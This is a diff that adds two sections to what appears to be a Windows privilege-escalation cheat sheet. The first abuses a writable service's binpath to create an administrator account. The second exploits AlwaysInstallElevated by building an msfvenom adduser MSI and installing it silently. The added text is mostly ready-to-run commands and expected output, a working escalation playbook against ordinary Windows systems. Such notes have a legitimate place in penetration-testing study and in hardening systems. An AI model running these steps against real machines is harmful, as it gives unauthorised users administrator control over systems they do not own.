@@ -72,4 +72,51 @@ icacls "C:\Program Files\Some Folder\"
 ➤ 6. Restart the service linked with service.exe
 sc stop SERVICENAME
 sc start SERVICENAME
+```
 
+## Vulnerable Services
+```
+➤ 1. Find vulnerable services 
+accesschk.exe -uwcqv "Authenticated Users" * /accepteula
+Output: RW PFNET SERVICE_ALL_ACCESS
+
+➤ 2. View the configuration properties of the PFNet Service 
+sc qc PFNet
+
+➤ 2. Use the BINARY_PATH_NAME value to execute command (here: add new user in adminstrators group)
+
+sc config PFNET binpath= "net user lexis P@ssword123! /add"
+sc stop PFNET
+sc start PFNET
+
+sc config PFNET binpath= "net localgroup Administrators lexis /add"
+sc stop PFNET
+sc start PFNET
+```
+
+## AlwaysInstallElevated
+```
+➤ 0. Explanation
+AlwaysInstallElevated is a setting that allows non-privileged users the ability to run Microsoft Windows Installer Package Files (MSI) with elevated (SYSTEM) permissions.
+
+➤ 1. check the values of these two registry entries (all need to be on 0x1)
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+Output: AlwaysInstallElevated   REG_DWORD   0x1
+
+➤ 2. Generate a MSI file which add our user in the Local Administrators group
+msfvenom -p windows/adduser USER=lexis PASS=mypassword123! -f msi -o exploit.msi
+
+➤ 3. Upload the MSI file on the victim
+
+➤ 4. Executre the MSI file
+msiexec /quiet /qn /i C:\Users\victim\Downloads\exploit.msi
+
+Note : 
+- /quiet = Suppress any messages to the user during installation
+- /qn = No GUI
+- /i = Regular (vs. administrative) installation
+  
+➤ 4. Verify that our user has been added in the localgroup Administrators
+net localgroup Administrators
+```
